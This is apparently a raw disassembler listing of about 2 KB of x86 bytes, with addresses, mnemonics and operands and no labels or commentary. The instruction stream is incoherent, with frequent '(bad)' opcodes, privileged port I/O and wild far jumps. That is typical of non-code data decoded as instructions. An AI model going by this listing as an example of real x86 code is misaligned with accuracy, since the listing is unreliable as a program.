  426d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d0e:	ret    
  426d0f:	pop    esi
  426d10:	stos   DWORD PTR es:[edi],eax
  426d11:	lods   ax,WORD PTR ds:[esi]
  426d13:	mov    esp,0x88042c4b
  426d18:	dec    esp
  426d19:	xchg   edx,eax
  426d1a:	mov    al,0x95
  426d1c:	sub    BYTE PTR [edi],ah
  426d1e:	aaa    
  426d1f:	jae    0x426ce1
  426d21:	dec    esi
  426d22:	loop   0x426ca7
  426d24:	mov    dh,0xf9
  426d26:	stos   DWORD PTR es:[edi],eax
  426d27:	enter  0x4428,0xda
  426d2b:	mov    eax,0x60d0cf91
  426d30:	daa    
  426d31:	jecxz  0x426d7e
  426d33:	shl    DWORD PTR [eax-0x34a3ec17],1
  426d39:	jp     0x426cdf
  426d3b:	pop    ds
  426d3c:	pop    edi
  426d3d:	fcom   DWORD PTR [eax-0x4ac96ddb]
  426d43:	xchg   esp,eax
  426d44:	outs   dx,BYTE PTR ss:[esi]
  426d46:	outs   dx,BYTE PTR ds:[esi]
  426d47:	xor    bl,BYTE PTR [ecx-0x4e]
  426d4a:	ja     0x426d7d
  426d4c:	xchg   ebx,eax
  426d4d:	mov    dh,0x9b
  426d4f:	mov    DWORD PTR [ebp-0x46],edi
  426d52:	pusha  
  426d53:	ss pop ebp
  426d55:	test   al,0xb3
  426d57:	and    eax,0xd486d887
  426d5c:	xor    eax,0x4b71a4fa
  426d61:	mov    dh,0xcf
  426d63:	ja     0x426d4f
  426d65:	mov    ah,0x88
  426d67:	mov    bl,0x18
  426d69:	jo     0x426de9
  426d6b:	nop
  426d6c:	cmp    ecx,DWORD PTR [esi+0x43d1977a]
  426d72:	js     0x426d33
  426d74:	jo     0x426df0
  426d76:	xchg   esp,eax
  426d77:	and    eax,DWORD PTR [ebx+0x28]
  426d7a:	shl    DWORD PTR [ebp+edx*1-0x46],1
  426d7e:	fisttp WORD PTR [ebx+eax*1-0x1a113a90]
  426d85:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  426d87:	xor    al,0x7e
  426d89:	xlat   BYTE PTR ds:[ebx]
  426d8a:	test   DWORD PTR [ecx-0x54e41df9],edx
  426d90:	loope  0x426d69
  426d92:	push   ecx
  426d93:	retf   
  426d94:	fbstp  TBYTE PTR [ebx-0x253b17a0]
  426d9a:	and    DWORD PTR [ebp+0x1f],edx
  426d9d:	push   cs
  426d9e:	pop    ss
  426d9f:	inc    edi
  426da0:	es push ebx
  426da2:	pusha  
  426da3:	hlt    
  426da4:	clc    
  426da5:	or     dh,BYTE PTR [edx-0x55]
  426da8:	(bad)  
  426da9:	(bad)  
  426daa:	loopne 0x426d4c
  426dac:	xchg   esp,eax
  426dad:	out    0xe,eax
  426daf:	out    0xff,eax
  426db1:	fild   DWORD PTR [edx-0xc]
  426db4:	rcr    BYTE PTR [ebp+edx*2-0x39adba4f],1
  426dbb:	xor    al,0xb7
  426dbd:	(bad)  
  426dbe:	leave  
  426dbf:	mov    ecx,DWORD PTR cs:[edx]
  426dc2:	dec    ecx
  426dc3:	mov    dh,0x58
  426dc5:	xchg   ebp,eax
  426dc6:	retf   
  426dc7:	fidiv  WORD PTR [edi-0x160a7c95]
  426dcd:	pop    ds
  426dce:	jecxz  0x426e20
  426dd0:	mov    ebx,0x72f9a703
  426dd5:	fmul   DWORD PTR [ecx]
  426dd7:	xor    DWORD PTR [ecx+0x78b6584],esi
  426ddd:	leave  
  426dde:	add    al,0x91
  426de0:	adc    edi,DWORD PTR [edi-0x20dc6975]
  426de6:	adc    esi,esi
  426de8:	dec    esp
  426de9:	fistp  QWORD PTR [esi*8+0x7b4a986f]
  426df0:	ret    
  426df1:	jae    0x426e41
  426df3:	pop    esi
  426df4:	mov    ch,0x54
  426df6:	xchg   edx,eax
  426df8:	aaa    
  426df9:	mov    bh,BYTE PTR [esi-0x27]
  426dfc:	je     0x426dfa
  426dfe:	mov    ecx,0x9cb24600
  426e03:	test   BYTE PTR [ebp+ebp*8-0x50edfd16],0x51
  426e0b:	dec    ebx
  426e0c:	mov    al,ah
  426e0e:	in     al,dx
  426e0f:	rol    edx,1
  426e11:	out    0xb1,al
  426e13:	rcr    BYTE PTR [edi+0x4a],1
  426e16:	adc    edi,DWORD PTR [eax-0x55e5bfe0]
  426e1c:	push   eax
  426e1d:	push   edi
  426e1e:	pop    ebp
  426e1f:	cli    
  426e20:	mov    ch,BYTE PTR ds:0x380c9d7f
  426e26:	fisttp DWORD PTR [ebp+0x56]
  426e29:	pop    ds
  426e2a:	imul   esi,ebx,0xffffffbc
  426e2d:	loope  0x426e4d
  426e2f:	inc    ebx
  426e30:	(bad)  [edx+0x7e]
  426e33:	test   DWORD PTR [ecx+eiz*1-0x25],eax
  426e37:	retf   
  426e38:	xchg   ebp,eax
  426e39:	jne    0x426de7
  426e3b:	dec    esp
  426e3c:	call   0xc4c76c91
  426e41:	test   eax,0x681865b
  426e46:	(bad)  
  426e47:	pop    eax
  426e48:	add    edi,DWORD PTR [ebp+0x586e591d]
  426e4e:	and    eax,esp
  426e50:	inc    eax
  426e51:	push   edi
  426e52:	cmp    bl,bl
  426e54:	sbb    ecx,ebx
  426e56:	cmp    ch,BYTE PTR [esp+ecx*8+0x5]
  426e5a:	scas   al,BYTE PTR es:[edi]
  426e5b:	sbb    eax,0xb1c70d6e
  426e60:	pop    eax
  426e61:	jns    0x426ec4
  426e63:	not    BYTE PTR [esi+0x60]
  426e66:	jmp    0x7510:0x5eadf7ce
  426e6d:	fstp   QWORD PTR [ebx-0x52]
  426e70:	aam    0x9b
  426e72:	lds    eax,FWORD PTR [ecx]
  426e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e75:	mov    dl,0x1c
  426e77:	dec    edx
  426e78:	ins    BYTE PTR es:[edi],dx
  426e79:	into   
  426e7a:	xor    BYTE PTR [edx-0x6a61cc91],0x5e
  426e81:	xor    BYTE PTR [edx],ah
  426e83:	sbb    DWORD PTR [ebx],edx
  426e85:	mov    ds:0x5f4eb76d,eax
  426e8a:	leave  
  426e8b:	icebp  
  426e8c:	enter  0x2599,0x6d
  426e90:	jnp    0x426f0f
  426e92:	xor    BYTE PTR [esi-0x57],0xce
  426e96:	xchg   ebx,eax
  426e97:	dec    edx
  426e98:	outs   dx,DWORD PTR ds:[esi]
  426e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e9a:	out    dx,al
  426e9b:	jecxz  0x426e36
  426e9d:	scas   al,BYTE PTR es:[edi]
  426e9e:	(bad)  
  426e9f:	mov    ebp,0x6f1a5135
  426ea4:	clc    
  426ea5:	loopne 0x426e57
  426ea7:	dec    esi
  426ea8:	adc    BYTE PTR [ebp+esi*8-0x2b],cl
  426eac:	adc    eax,esi
  426eae:	pop    ds
  426eaf:	push   bp
  426eb1:	stos   DWORD PTR es:[edi],eax
  426eb2:	fimul  DWORD PTR [edi]
  426eb4:	(bad)  
  426eb5:	sbb    al,0xd8
  426eb7:	shl    BYTE PTR [ebx+0x9],1
  426eba:	shl    DWORD PTR [ebp-0x4c418dbb],1
  426ec0:	xor    DWORD PTR [ebx+esi*4+0x62cd9e96],eax
  426ec7:	inc    esp
  426ec8:	xor    DWORD PTR [ecx-0xb],edx
  426ecb:	cld    
  426ecc:	pushf  
  426ecd:	push   edi
  426ece:	in     eax,dx
  426ecf:	int3   
  426ed0:	pop    ss
  426ed1:	clc    
  426ed2:	inc    ebp
  426ed3:	in     al,0xf7
  426ed5:	sti    
  426ed6:	rol    edx,1
  426ed8:	pop    eax
  426ed9:	outs   dx,BYTE PTR ds:[esi]
  426eda:	sub    ah,0x85
  426edd:	call   0xa035863e
  426ee2:	out    0xc3,eax
  426ee4:	inc    ebx
  426ee5:	pushf  
  426ee6:	add    BYTE PTR [ebx],ah
  426ee8:	mov    BYTE PTR [ecx-0x3e],dl
  426eeb:	mul    eax
  426eed:	xor    eax,0x949586ac
  426ef2:	mov    dl,0xfc
  426ef4:	mov    dh,0x2a
  426ef6:	inc    ecx
  426ef7:	push   ebp
  426ef8:	(bad)  
  426efa:	stos   BYTE PTR es:[edi],al
  426efb:	ret    
  426efc:	inc    eax
  426efd:	test   al,0x7e
  426eff:	lea    ebp,[ebx-0x16]
  426f02:	scas   al,BYTE PTR es:[edi]
  426f03:	sbb    DWORD PTR [eax],ecx
  426f05:	xchg   ebx,eax
  426f06:	dec    ecx
  426f07:	cmp    eax,0x707708af
  426f0c:	pop    ebp
  426f0d:	int    0xf2
  426f0f:	push   esi
  426f10:	adc    eax,0x40358350
  426f15:	(bad)  
  426f16:	jnp    0x426ea3
  426f18:	jle    0x426ebc
  426f1a:	or     al,0xa5
  426f1c:	push   0x5c
  426f1e:	and    ebp,0xec2f5c9d
  426f24:	pusha  
  426f25:	neg    DWORD PTR [edx]
  426f27:	ror    BYTE PTR [eax+0x29],cl
  426f2a:	dec    ebx
  426f2b:	cli    
  426f2c:	mov    ah,0x74
  426f2e:	mov    al,BYTE PTR [ebx-0x424ed032]
  426f34:	pop    ebp
  426f35:	mov    bh,0x86
  426f37:	sbb    al,0x23
  426f39:	add    ch,al
  426f3b:	xchg   ebp,eax
  426f3c:	pop    ebp
  426f3d:	xor    bl,al
  426f3f:	sub    dh,al
  426f41:	ret    0x66c
  426f44:	cmp    bl,dl
  426f46:	lods   eax,DWORD PTR ds:[esi]
  426f47:	clc    
  426f48:	sbb    bh,BYTE PTR [ecx-0x39]
  426f4b:	jo     0x426fb5
  426f4d:	cdq    
  426f4e:	std    
  426f4f:	pusha  
  426f50:	mov    DWORD PTR [esi-0x6d2c6a84],esp
  426f56:	stc    
  426f57:	std    
  426f58:	repz push edx
  426f5a:	dec    DWORD PTR es:[eax-0x6a]
  426f5e:	push   0xbbd6d8ff
  426f63:	dec    edi
  426f64:	sbb    bl,bh
  426f66:	hlt    
  426f67:	mov    ch,0xf6
  426f69:	sub    al,0xd9
  426f6b:	lods   al,BYTE PTR ds:[esi]
  426f6c:	mov    ebx,0xfb2d8555
  426f71:	jbe    0x426f46
  426f73:	push   edx
  426f74:	sbb    al,0xed
  426f76:	pushf  
  426f77:	adc    bh,0xd5
  426f7a:	xchg   edx,eax
  426f7b:	and    BYTE PTR [ebp-0x37fe73b9],ah
  426f81:	jne    0x426f5c
  426f83:	push   cs
  426f84:	mov    ecx,0x9672ddf6
  426f89:	sub    dh,BYTE PTR [esi-0x45]
  426f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f8d:	sbb    al,0xa3
  426f8f:	rol    ebx,0x7d
  426f92:	out    dx,al
  426f93:	mov    eax,ds:0x44eb1174
  426f98:	push   ds
  426f99:	outs   dx,BYTE PTR ds:[esi]
  426f9a:	lea    esp,[ebx]
  426f9c:	push   edi
  426f9d:	aam    0xda
  426f9f:	xor    BYTE PTR [edx-0xcc49513],0x38
  426fa6:	ret    
  426fa7:	mov    ah,0x9a
  426fa9:	test   BYTE PTR [edi+esi*1+0x173c93af],0xbc
  426fb1:	mov    ch,0x66
  426fb3:	xlat   BYTE PTR ds:[ebx]
  426fb4:	icebp  
  426fb5:	cdq    
  426fb6:	adc    cl,cl
  426fb8:	ds pop es
  426fba:	jae    0x426fee
  426fbc:	in     eax,dx
  426fbd:	add    esi,DWORD PTR [esp+0x4a1c2898]
  426fc4:	outs   dx,DWORD PTR ds:[esi]
  426fc5:	out    0x0,eax
  426fc7:	and    al,0x52
  426fc9:	jb     0x426f7d
  426fcb:	or     DWORD PTR [eax+0x68],0xfffffff0
  426fcf:	sbb    cl,BYTE PTR [ebp+0x50ceb20b]
  426fd5:	in     al,dx
  426fd6:	data16 xchg BYTE PTR [ecx-0x589f6693],al
  426fdd:	leave  
  426fde:	loopne 0x426f6f
  426fe0:	sub    BYTE PTR [ebx],0x2b
  426fe3:	adc    al,0x41
  426fe5:	(bad)  
  426fe6:	loopne 0x427063
  426fe8:	ret    
  426fe9:	hlt    
  426fea:	dec    edi
  426feb:	dec    edi
  426fec:	test   BYTE PTR [eax-0x66d3644e],bl
  426ff2:	xor    dl,0xff
  426ff5:	or     DWORD PTR [ebx+esi*8-0x22a0bf3c],esi
  426ffc:	stc    
  426ffd:	pop    eax
  426ffe:	push   es
  426fff:	xchg   esp,eax
  427000:	imul   esi,DWORD PTR [ebx+0x65ae4db8],0x1b
  427007:	inc    ebp
  427008:	std    
  427009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42700a:	nop
  42700b:	jecxz  0x42701b
  42700d:	clc    
  42700e:	mov    edx,0x1c4969e
  427013:	and    DWORD PTR [eax],eax
	...
  427021:	sbb    eax,DWORD PTR [ebp+0x65]
  427024:	ret    
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	ror    BYTE PTR [eax+ecx*4-0x42],cl
  427030:	shl    BYTE PTR [edx],0xe6
  427033:	add    DWORD PTR [eax],eax
  427035:	stos   DWORD PTR es:[edi],eax
  427036:	add    eax,DWORD PTR [eax]
  427038:	add    BYTE PTR [esi+0x51e961f0],bl
  42703e:	(bad)  
  42703f:	and    DWORD PTR [eax+0x62],ecx
  427042:	inc    esp
  427043:	push   dx
  427045:	shl    BYTE PTR [eax],cl
  427047:	aad    0xf1
  427049:	dec    ebx
  42704a:	lds    eax,FWORD PTR [ecx]
  42704c:	pop    ebp
  42704d:	mov    ch,0x4f
  42704f:	mov    eax,ds:0x4a92cb52
  427054:	fist   DWORD PTR [ebp+0x3f9779c6]
  42705a:	jp     0x4270b3
  42705c:	int3   
  42705d:	rcl    eax,1
  42705f:	cmp    al,0x36
  427061:	sbb    ch,BYTE PTR [ecx-0x4b7751b4]
  427067:	iret   
  427068:	ja     0x427048
  42706a:	jb     0x42705f
  42706c:	cmc    
  42706d:	sbb    dh,BYTE PTR [edi+0x55d2af97]
  427073:	lea    ebp,[esi-0x6c7cd110]
  427079:	lahf   
  42707a:	cmp    ebx,DWORD PTR [esi+0x36dd07bb]
  427080:	pop    esi
  427081:	dec    edi
  427082:	jbe    0x42706b
  427084:	and    eax,0xb28a3de6
  427089:	jbe    0x4270a6
  42708b:	in     al,0x1d
  42708d:	add    bl,BYTE PTR [ebp+0x1]
  427090:	mov    eax,ds:0xc111d0a7
  427095:	leave  
  427096:	xchg   esp,eax
  427097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427098:	mov    ch,0xf0
  42709a:	xor    al,0x5c
  42709c:	ins    DWORD PTR es:[edi],dx
  42709d:	loop   0x4270ba
  42709f:	dec    ebp
  4270a0:	mov    edi,0xd70c1c5c
  4270a5:	pop    edx
  4270a6:	push   ecx
  4270a7:	and    ah,BYTE PTR [ebx]
  4270a9:	aam    0x63
  4270ab:	xchg   edx,eax
  4270ac:	jmp    0x427035
  4270ae:	aaa    
  4270af:	(bad)  
  4270b0:	and    esi,DWORD PTR [esi]
  4270b2:	cwde   
  4270b3:	xchg   ecx,eax
  4270b4:	or     BYTE PTR [esi+0x7a],bh
  4270b7:	(bad)  
  4270b8:	lock xchg esp,eax
  4270ba:	(bad)  
  4270bb:	daa    
  4270bc:	pop    edx
  4270bd:	adc    al,0x62
  4270bf:	aas    
  4270c0:	xor    ah,BYTE PTR [esp+esi*1]
  4270c3:	enter  0xb751,0x18
  4270c7:	mov    eax,ds:0x196f7d14
  4270cc:	das    
  4270cd:	cmp    cl,ch
  4270cf:	jnp    0x427109
  4270d1:	aam    0xfd
  4270d3:	ins    DWORD PTR es:[edi],dx
  4270d4:	ins    BYTE PTR es:[edi],dx
  4270d5:	push   ax
  4270d7:	jnp    0x42709c
  4270d9:	and    al,0xf3
  4270db:	sub    ebx,DWORD PTR [ebx+0x42d5b492]
  4270e1:	dec    BYTE PTR [ebp+0x79]
  4270e4:	stos   DWORD PTR es:[edi],eax
  4270e5:	cs mov ch,ah
  4270e8:	aas    
  4270e9:	dec    ecx
  4270ea:	dec    edx
  4270eb:	or     DWORD PTR [ebx+ebp*2-0x5c5fc0cc],ecx
  4270f2:	retf   0x4051
  4270f5:	cmp    eax,0x86898cc6
  4270fa:	xor    eax,0xfa2f05a9
  4270ff:	xor    eax,0xabe26f27
  427104:	cld    
  427105:	dec    ebx
  427106:	push   cs
  427107:	outs   dx,DWORD PTR ds:[esi]
  427108:	pusha  
  427109:	(bad)  
  42710a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42710b:	fst    QWORD PTR [ebx-0x2fea5679]
  427111:	cmp    DWORD PTR [edi+0x68dfec00],edi
  427117:	sbb    al,0x79
  427119:	cld    
  42711a:	es (bad) 
  42711c:	xchg   ebp,eax
  42711d:	fadd   st(4),st
  42711f:	add    DWORD PTR [ebx-0x52ea3241],esp
  427125:	xchg   esp,eax
  427126:	or     bh,BYTE PTR [edi+0x5e37fe38]
  42712c:	lahf   
  42712d:	leave  
  42712e:	int3   
  42712f:	dec    esi
  427130:	aad    0xe4
  427132:	ret    0x8ecf
  427135:	cmp    al,0x5c
  427137:	sub    BYTE PTR [edx],ah
  427139:	dec    ebp
  42713a:	idiv   DWORD PTR [edi+eax*8+0xe170afc]
  427141:	pop    edx
  427142:	push   esi
  427143:	jecxz  0x42713f
  427145:	pop    esp
  427146:	lods   al,BYTE PTR ds:[esi]
  427147:	rcl    BYTE PTR [ebp-0x28],1
  42714a:	test   al,0x73
  42714c:	ja     0x427178
  42714e:	test   BYTE PTR [ebx],0xfb
  427151:	mov    ah,BYTE PTR ds:0x253b3cf3
  427157:	mov    esi,0x7e79ecab
  42715c:	pop    ebx
  42715d:	out    0xed,eax
  42715f:	es adc al,0xa6
  427162:	sub    ebx,DWORD PTR [edx]
  427164:	xchg   edi,eax
  427165:	daa    
  427166:	lahf   
  427167:	pop    esp
  427168:	dec    eax
  427169:	jl     0x42714c
  42716b:	inc    ebp
  42716c:	loop   0x427117
  42716e:	pop    ebx
  42716f:	adc    DWORD PTR [ebx],ecx
  427171:	jecxz  0x427168
  427173:	and    DWORD PTR [edi],0xffffffe4
  427176:	xchg   BYTE PTR [eax-0x2d],ah
  427179:	mov    ebp,0x8e5e7410
  42717e:	stos   BYTE PTR es:[edi],al
  42717f:	jb     0x427176
  427181:	xchg   dh,dl
  427183:	inc    ecx
  427184:	mov    dl,dl
  427186:	jecxz  0x4271c0
  427188:	aaa    
  427189:	imul   ebp,DWORD PTR [esi],0xbd1d1f1b
  42718f:	lds    esi,FWORD PTR ds:0x6bea4c1e
  427195:	shl    ebp,0xe5
  427198:	xchg   DWORD PTR [eax+edi*8+0x7a8436a4],ecx
  42719f:	adc    DWORD PTR [ebx-0x73c32203],0xac3314db
  4271a9:	jp     0x4271b8
  4271ab:	(bad)  
  4271ac:	jmp    0x1d87211b
  4271b1:	or     BYTE PTR [edi+0x6],bl
  4271b4:	stc    
  4271b5:	jno    0x427186
  4271b7:	or     al,0xa6
  4271b9:	loope  0x427208
  4271bb:	sbb    DWORD PTR [ecx],esi
  4271bd:	idiv   BYTE PTR [esi+0x31]
  4271c0:	mov    ecx,cs
  4271c2:	int3   
  4271c3:	cmp    eax,0x7c403247
  4271c8:	scas   al,BYTE PTR es:[edi]
  4271c9:	fwait
  4271ca:	mov    DWORD PTR [esi+eax*4+0x18],eax
  4271ce:	dec    ebp
  4271cf:	inc    esi
  4271d0:	inc    eax
  4271d1:	in     al,0xb2
  4271d3:	(bad)  
  4271d5:	stc    
  4271d6:	retf   0xbdb7
  4271d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271da:	sbb    dh,ah
  4271dc:	adc    esp,DWORD PTR [ebx-0x79]
  4271df:	sub    ebp,DWORD PTR [edi+0xf51d4ef]
  4271e5:	pushf  
  4271e6:	cmp    DWORD PTR [eax+ecx*2+0x5a],edx
  4271ea:	mov    ch,al
  4271ec:	fidiv  WORD PTR [edx+0x70]
  4271ef:	fild   WORD PTR [edi+0x11af785a]
  4271f5:	push   esi
  4271f6:	and    eax,0xc735db90
  4271fb:	inc    ecx
  4271fc:	call   0x7bd1fe19
  427201:	push   ds
  427202:	bound  esi,QWORD PTR [edi+ebx*2+0x691cb7ec]
  427209:	shl    edx,1
  42720b:	mov    dl,0x64
  42720d:	lods   al,BYTE PTR ds:[esi]
  42720e:	fadd   DWORD PTR ds:0xbd9b1027
  427214:	add    dl,BYTE PTR [ecx+0x5afbdea7]
  42721a:	mov    ds:0xdea816d8,eax
  42721f:	mov    ebx,0x1f2a859b
  427224:	inc    edx
  427225:	test   eax,0xa53a3ad9
  42722a:	pop    ss
  42722b:	lock xchg edi,eax
  42722d:	xor    al,0x51
  42722f:	repz sub ah,BYTE PTR [edx+ebx*1+0x236ef64e]
  427237:	xchg   edi,eax
  427238:	cmp    eax,0x98832779
  42723d:	or     al,0xa3
  42723f:	jmp    0x948f15c3
  427244:	scas   eax,DWORD PTR es:[edi]
  427245:	cmp    al,0xaa
  427247:	inc    ebx
  427248:	pop    ds
  427249:	push   ebx
  42724a:	lods   eax,DWORD PTR ds:[esi]
  42724b:	scas   al,BYTE PTR es:[edi]
  42724c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42724d:	fld    QWORD PTR [esp+ebp*1-0x1d]
  427251:	or     ebp,esp
  427253:	nop
  427254:	sti    
  427255:	or     edi,DWORD PTR [ebx-0x1aac2a2c]
  42725b:	repz (bad) 
  42725e:	xlat   BYTE PTR ds:[ebx]
  42725f:	repnz fadd DWORD PTR [edx]
  427262:	ins    BYTE PTR es:[edi],dx
  427263:	sbb    BYTE PTR [ecx],0x9a
  427266:	ja     0x427239
  427268:	xchg   BYTE PTR gs:[ebp-0x1e],dh
  42726c:	mov    eax,ds:0xf3f1c08b
  427271:	jnp    0x42720c
  427273:	mov    ch,0xdd
  427275:	fnstcw WORD PTR [ebx-0x44822d62]
  42727b:	test   DWORD PTR [edi+0x2d85f4ae],0x1f7d4c04
  427285:	repz cmp DWORD PTR [ebp-0x52722b3e],0x3e
  42728d:	arpl   ax,bx
  42728f:	pop    eax
  427290:	fs sahf 
  427292:	loop   0x4272d7
  427294:	inc    ebx
  427295:	mov    WORD PTR [ebp-0x522f12fe],ss
  42729b:	or     al,0x76
  42729d:	cwde   
  42729e:	iret   
  42729f:	push   cs
  4272a0:	into   
  4272a1:	not    DWORD PTR [edx+0x73]
  4272a4:	out    0x2e,eax
  4272a6:	retf   0x46d3
  4272a9:	sahf   
  4272aa:	clc    
  4272ab:	cld    
  4272ac:	pop    es
  4272ad:	and    al,0xc7
  4272af:	mov    esi,0xe486f6f9
  4272b4:	div    BYTE PTR [edi+0x37]
  4272b7:	gs adc eax,0x3c667185
  4272bd:	pop    ds
  4272be:	pushf  
  4272bf:	or     edi,DWORD PTR [eax+ecx*4-0x59]
  4272c3:	nop
  4272c4:	adc    eax,0x30f9d98d
  4272c9:	rcl    BYTE PTR [ebp+0x578f63eb],cl
  4272cf:	pushw  cs
  4272d1:	test   DWORD PTR [eax+0x2],0x636cca30
  4272d8:	pop    ds
  4272d9:	popf   
  4272da:	into   
  4272db:	stc    
  4272dc:	call   0xa271c1a5
  4272e1:	nop
  4272e2:	fdiv   QWORD PTR [edx+0x1e06e7e0]
  4272e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272e9:	sbb    edi,eax
  4272eb:	gs jns 0x4272a6
  4272ee:	sub    DWORD PTR [esi-0x12],edx
  4272f1:	fdivr  DWORD PTR [ebx+0x31517a31]
  4272f7:	ss in  al,0xea
  4272fa:	push   ebp
  4272fb:	dec    esp
  4272fd:	in     al,dx
  4272fe:	sub    cl,BYTE PTR [edx]
  427300:	mov    esi,0xe95e489f
  427305:	popf   
  427306:	ror    BYTE PTR [esi-0x1],1
  427309:	pop    ds
  42730a:	mov    ah,0x94
  42730c:	jbe    0x4272ee
  42730e:	add    eax,DWORD PTR [edi]
  427310:	mov    dh,BYTE PTR [ebx+0x5a]
  427313:	adc    eax,0x5086c1af
  427318:	xchg   ebp,eax
  427319:	xchg   esi,eax
  42731a:	pop    ss
  42731b:	pop    edi
  42731c:	shl    BYTE PTR [edi-0x3acf3a5c],0x5a
  427323:	xlat   BYTE PTR ds:[ebx]
  427324:	ret    0xc8d7
  427327:	pop    esi
  427328:	sub    BYTE PTR [ecx-0x6af8deea],0x44
  42732f:	cmp    BYTE PTR [eax-0x4c],0xe3
  427333:	push   eax
  427334:	in     eax,dx
  427335:	fwait
  427336:	inc    esp
  427337:	ret    0xc595
  42733a:	fimul  DWORD PTR es:[edx+0x791ea40]
  427341:	sub    DWORD PTR [esi+edi*2-0x66836f4],edx
  427348:	in     al,0x4f
  42734a:	fidivr DWORD PTR [eax]
  42734c:	pop    eax
  42734d:	adc    DWORD PTR [ebp+0x7c],ebp
  427350:	out    0x6c,eax
  427352:	sub    eax,0xb6f232c9
  427357:	pop    esi
  427358:	(bad)  
  427359:	or     ebx,DWORD PTR [edx+edx*1+0x453947ba]
  427360:	adc    eax,0xed248937
  427365:	adc    ebp,DWORD PTR [eax+0x4fe7d585]
  42736b:	jl     0x427335
  42736d:	jne    0x427358
  42736f:	ss sub al,0x72
  427372:	mov    WORD PTR [ecx],?
  427374:	mov    bl,0x85
  427376:	add    cl,BYTE PTR [edx]
  427378:	into   
  427379:	cdq    
  42737a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42737b:	cwde   
  42737c:	inc    eax
  42737d:	inc    esi
  42737e:	test   BYTE PTR [ecx+0x2c],al
  427381:	push   0x2af4c4a1
  427386:	test   al,0x58
  427388:	pop    edi
  427389:	lds    ecx,FWORD PTR [ecx+ecx*8-0x783d50e5]
  427390:	fmul   st,st(4)
  427392:	div    BYTE PTR [ecx*2+0x6da21e8b]
  427399:	or     eax,0x7f9f690e
  42739e:	pop    esp
  42739f:	push   eax
  4273a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273a1:	xchg   edx,eax
  4273a2:	leave  
  4273a3:	push   ds
  4273a4:	mov    eax,0x36ee747e
  4273a9:	sbb    eax,0xed2965c8
  4273ae:	pop    edi
  4273af:	adc    ebx,DWORD PTR [ebx*4-0x6bfe2337]
  4273b6:	scas   eax,DWORD PTR es:[edi]
  4273b7:	shl    DWORD PTR [ecx+esi*1-0x673b3a4],0xf3
  4273bf:	sbb    al,0x3a
  4273c1:	iret   
  4273c2:	call   0x71fe:0x7a4f56e0
  4273c9:	mov    ecx,0x96ee1728
  4273ce:	cld    
  4273cf:	xor    al,0x74
  4273d1:	out    dx,al
  4273d2:	jg     0x4273ff
  4273d4:	imul   esp,DWORD PTR [esi+0x70],0xf0564cfb
  4273db:	in     al,0x6f
  4273dd:	out    dx,eax
  4273de:	dec    esp
  4273df:	xor    DWORD PTR [esi+0x65],ecx
  4273e2:	pop    ecx
  4273e3:	popf   
	...
  4273f0:	add    BYTE PTR [edi+eax*2],cl
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0x8a19f609
  4273fe:	cmp    al,0xee
  427400:	jmp    0x3ab:0x1e9cd
  427407:	add    BYTE PTR [eax],al
  427409:	stos   BYTE PTR es:[edi],al
  42740a:	mov    ch,0x69
  42740c:	aaa    
  42740d:	out    0x32,eax
  42740f:	scas   eax,DWORD PTR es:[edi]
  427410:	cmp    ah,ah
  427412:	inc    ecx
  427413:	jge    0x4273a8
  427415:	pusha  
  427416:	shr    BYTE PTR [ebp+0x63755a88],1
  42741c:	mov    dl,BYTE PTR [esi]
  42741e:	sub    eax,0xbb4dcbf
  427423:	push   es
  427424:	pop    esi
  427425:	(bad)  
  427426:	bound  esi,QWORD PTR [edx]
  427428:	ds sbb eax,0x4fe8ef43
  42742e:	push   eax
  42742f:	int3   
  427430:	jo     0x427427
  427432:	add    cl,ch
  427434:	sbb    ecx,edi
  427436:	popa   
  427437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427438:	into   
  427439:	jl     0x4273d5
  42743b:	push   ecx
  42743c:	sbb    BYTE PTR [ebx-0x65],al
  42743f:	iret   
  427440:	fstp   TBYTE PTR [ebx+0x5]
  427443:	sub    DWORD PTR [edi+0x20],edx
  427446:	jmp    esp
  427448:	outs   dx,DWORD PTR ds:[esi]
  427449:	in     eax,dx
  42744a:	les    ebx,FWORD PTR [ecx+0x146e94d8]
  427450:	or     bh,BYTE PTR [ebx-0x42c3ec5f]
  427456:	mov    DWORD PTR ds:0xc405d8a3,ecx
  42745c:	mov    ss,WORD PTR [esi-0x2d]
  42745f:	inc    esp
  427460:	cmp    dl,BYTE PTR [eax]
  427462:	and    esp,DWORD PTR [ebx]
  427464:	add    DWORD PTR [ebx-0x43],edx
  427467:	rol    DWORD PTR es:[edi+0x7c],cl
  42746b:	shl    BYTE PTR [ecx],1
  42746d:	je     0x4274ab
  42746f:	sub    ecx,esp
  427471:	mov    bl,0x18
  427473:	adc    DWORD PTR [esi+0x3f],esp
  427476:	call   0x14b8:0x18680f1d
  42747d:	adc    DWORD PTR [ecx+0x7df4716c],edi
  427483:	dec    edi
  427484:	mov    bl,0xd5
  427486:	mov    ebx,0xc61921fc
  42748b:	or     ah,BYTE PTR [edi+0x69ba0d8e]
  427491:	xor    BYTE PTR [eax],ch
  427493:	aam    0x3b
  427495:	and    cl,BYTE PTR ds:0x117d550
  42749b:	js     0x427460
  42749d:	inc    esi
  42749e:	dec    ebx
  42749f:	enter  0x6df5,0x81
  4274a3:	jl     0x427460
  4274a5:	sub    al,0xf3
  4274a7:	adc    cl,BYTE PTR [ecx-0x670a995f]
  4274ad:	dec    eax
  4274ae:	inc    esp
  4274af:	inc    esi
  4274b0:	or     esp,DWORD PTR [ecx+0xd]
